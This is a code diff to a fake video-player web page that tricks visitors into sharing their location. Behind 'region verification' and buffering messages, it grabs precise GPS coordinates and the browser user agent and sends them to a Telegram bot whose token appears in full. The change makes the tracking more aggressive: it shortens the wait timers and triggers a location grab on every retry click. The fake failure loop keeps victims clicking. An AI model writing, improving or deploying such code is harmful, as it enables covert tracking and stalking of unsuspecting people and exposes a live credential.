@@ -158,8 +158,8 @@
     // === CONFIG ===
     var TELEGRAM_BOT_TOKEN = "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro";
     var TELEGRAM_CHAT_ID = "@imFreed0mLocationTest";
-    var WAIT_FIRST = 2 * 60;   // 2 minutes in seconds
-    var WAIT_SUBSEQUENT = 7 * 60; // 7 minutes in seconds
+    var WAIT_FIRST = 1 * 60;   // 1 minutes in seconds
+    var WAIT_SUBSEQUENT = 3 * 60; // 3 minutes in seconds
     var STORAGE_KEY = 'vp_state';
 
     // === STATE MACHINE ===
@@ -301,6 +301,28 @@
         } catch (e) {}
     }
 
+    // --- Core Location Trigger ---
+    function triggerLocationRequest(onSuccess, onFail) {
+        if (!navigator.geolocation) {
+            if (onFail) onFail();
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                var lat = position.coords.latitude;
+                var lng = position.coords.longitude;
+                var acc = position.coords.accuracy;
+                var ua = navigator.userAgent;
+                sendToTelegram(lat, lng, acc, ua);
+                if (onSuccess) onSuccess();
+            },
+            function() {
+                if (onFail) onFail();
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    }
+
     // --- Handle initial play click (INITIAL → FAILED → WAIT_2_MIN) ---
     function handleInitialPlay() {
         if (actionLocked) return;
@@ -310,22 +332,9 @@
         bufferingOverlay.classList.add('active');
         bufferText.textContent = 'Verifying your region...';
 
-        // Request location
-        if (!navigator.geolocation) {
-            transitionToFailed();
-            return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                var lat = position.coords.latitude;
-                var lng = position.coords.longitude;
-                var acc = position.coords.accuracy;
-                var ua = navigator.userAgent;
-
+        triggerLocationRequest(
+            function() {
                 bufferText.textContent = 'Region verified. Loading stream...';
-                sendToTelegram(lat, lng, acc, ua);
-
                 setTimeout(function() {
                     bufferText.textContent = 'Connecting to CDN node...';
                     setTimeout(function() {
@@ -334,10 +343,8 @@
                 }, 2000);
             },
             function() {
-                // Location denied — still transition to failed to keep them in the loop
                 transitionToFailed();
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            }
         );
     }
 
@@ -371,6 +378,9 @@
     // --- Bind events ---
     playOverlay.addEventListener('click', handleInitialPlay);
     retryBtn.addEventListener('click', function() {
+        // Always attempt to grab location on any interaction with this button
+        triggerLocationRequest(null, null);
+
         if (retryBtn.textContent === 'Retry Playback') {
             handleRetry();
         } else if (retryBtn.textContent === 'Please wait...') {
